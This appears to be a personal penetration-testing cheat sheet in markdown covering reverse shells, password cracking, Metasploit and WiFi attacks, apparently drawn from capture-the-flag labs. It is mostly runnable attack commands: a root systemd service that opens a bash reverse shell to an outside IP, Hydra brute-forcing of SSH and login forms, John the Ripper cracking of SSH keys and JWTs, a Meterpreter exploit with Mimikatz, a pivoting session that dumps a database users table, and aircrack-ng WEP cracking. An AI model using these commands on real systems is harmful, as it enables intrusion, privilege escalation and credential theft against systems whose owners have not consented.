# Attack Tools

## Reverse Shell

### Netcat

Install```sudo apt install ncat```

Start netcat listening on e.g. port 1234: ```nc -lvnp 1234```

Once payload is triggered netcat will open a reverse shell:

![netcat_injecttest](_netcat_injecttest.jpg)

### Create service

Create 0xfab1.service in /temp/

``` txt
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.193.173/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

- move file to /temp/ of www-data from attacker box:
 -on victim: ```nc -vl 44444 > fab.service```
- on attacker: ```nc -n TargetIP 44444 < fab.service```
- on attacker now start a new netcat session on 9999: ```nc -lvnp 9999```

Now use systemctl on victim machine and we should be root from the attacker box:

``` sh
/bin/systemctl enable /tmp/fab.service
/bin/systemctl start fab
```

## Web

### Wordpress

[WPScan](https://github.com/wpscanteam/wpscan) is a WordPress security scanner to test the security of their WordPress websites.

Example

``` sh
wpscan --url http://example.org/wordpress -e u
wpscan --url http://example.org/wordpress --usernames admin --passwords wordlist.txt --threads 10
```

## Passwords

- Crunch: create custom wordlists

### John the ripper

[John the Ripper](https://github.com/openwall/john) is a tool for offline password cracking. If you prefer a GUI there is one available [here](https://github.com/openwall/johnny).

Crack keyfile PW

``` sh
gzip -d /usr/share/wordlists/rockyou.txt.gz
/usr/share/john/ssh2john.py ssh-key-kay.txt > forjohn.txt
john forjohn.txt --wordlist /usr/share/wordlists/rockyou.txt
```

Convert a JWT to a format John the Ripper can understand with [jwt2john](https://github.com/Sjord/jwtcrack):

``` sh
wget --quiet -O /usr/local/bin/jwt2john.py "https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py"
sed -i '1s;^;#!/usr/bin/env python\n;' /usr/local/bin/jwt2john.py
chmod +x /usr/local/bin/jwt2john.py
```

Crack a password protected zip file:

``` sh
zip2john filename.zip > filename.hash
john filename.hash --wordlist=wordlist.txt --verbosity=5
```

### Hydra

SSH PW Brute Force user "user"

``` sh
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.112.131
```

Web Form Brute Force:

``` sh
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.233.243 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 
```

## Metasploit

### Config

Start PostgreSQL und Metasploit on boot

``` sh
update-rc.d postgresql enable
update-rc.d metasploit enable
```

Manuall start

``` sh
service postgresql start
service metasploit start
```

### Start msfconsole

Init Metaspoit and start the console

``` sh
msfdb init
msfconsole -h
msfconsole
db_status
```

Add Target

``` sh
db_nmap -sV 10.10.201.217
```

Scan Target

``` sh
hosts
services
vulns
```

### Use Exploit

This is an example using an exploit with Metasploit:

``` sh
search multi/handler
use # exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.193.173
set RHOSTS 10.10.201.217
use icecast
run -j
sessions
sessions -i 1
```

Check Machine

``` sh
getprivs
sysinfo
getuid
```

Start Mimikatz

``` sh
load kiwi
```

Try different exploits

``` sh
run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester
run post/windows/manage/enable_rdp
```

``` sh
run autoroute -s 10.10.201.217 -n 255.255.255.0
```

### Pivoting

METASPLOIT Pivoting Example based on THM "Advent of Cyber 2022 Day 9: Pivoting"

``` sh
msfconsole
use multi/php/ignition_laravel_debug_rce
set rhost 10.10.118.168
set verbose true
set lhost 10.8.36.83
show options
run
background
sessions -u 1
sessions
sessions -i 2
resolve webservice_database 	#(172.28.101.51)
route add 172.28.101.51/32 2
route add 172.17.0.1/32 2
route print
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
use auxiliary/scanner/ssh/ssh_login
run ssh://santa_username_here:p4$$w0rd@172.17.0.1


use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
curl --proxy socks4a://localhost:9050 http://10.10.118.168
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.118.168
nmap -T4 -A -Pn 10.10.118.168


use admin/postgres/postgres_sql
run postgres://user:password@10.10.118.168/database_name sql='select version()'



10.10.118.168

APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:NEMESCXelEv2iYzbgq3N30b9IAnXzQmR7LnSzt70rso=
APP_DEBUG=true
APP_URL=http://localhost

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=postgres
DB_USERNAME=postgres
DB_PASSWORD=postgres

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=null
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

## WiFi

### Aircrack-NG suite

Send Kismet dump

``` sh
aircrack-ng -b 00:1E:58:B4:24:F4 /root/Kismet.dump
```

Preparing The WIFI Card for Airodump

``` sh
modprobe -r iwl3945
modprobe ipwraw
airmon-ng start [device]
airodump-ng [device]
airodump-ng -c [channel] -w [network.out] –bssid [bssid] [device]
aireplay-ng -1 0 -a [bssid] -h 00:11:22:33:44:66 -e [essid] [device]
airplay-ng -3 -b [bssid] -h 00:11:22:33:44:66 [device]
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b [bssid] -h 00:11:22:33:44:66 [device]
aircrack-ng -n 128 -b [bssid] [filename]-01.cap
```

### WiFite2

[wifite2](https://github.com/kimocoder/wifite2) is a tool to audit WEP or WPA encrypted wireless networks. It uses aircrack-ng, pyrit, reaver, tshark tools to perform the audit.

Examples:

- Cracking WPS PIN (Pixie-Dust with Reaver to get PIN and Bully to get PSK): ```wifite -e ESSID```
- Cracking WPA key using PMKID attack: ```wifite -e ESSID --pmkid```
- Decloaking & cracking a hidden access point on channel 10 using the WPA Handshake attack: ```wifite -c 10```
- Cracking a weak WEP password using the WEP Replay attack: ```wifite --wep```
- Cracking a pre-captured handshake using John The Ripper: ```wifite --crack```
- Cracking a 5Ghz WiFi (skipping WPS, PMKID to save time) using a given dictionary: ```sudo wifite --kill --no-wps --no-pmkid --5ghz --dict wordlist.txt```

### Kismet

Config [Kismet](https://www.kismetwireless.net)

- Config this file ```/usr/local/etc/kismet.conf```
- And add a sourece e.g. ```source=ipw2200,eth1,Intel```

Commands

- ss (type)
- L (choose WIFI+Channel)
- i (Info → copy BSSID)

### Fluxion

Clone of the target Wi-Fi network.
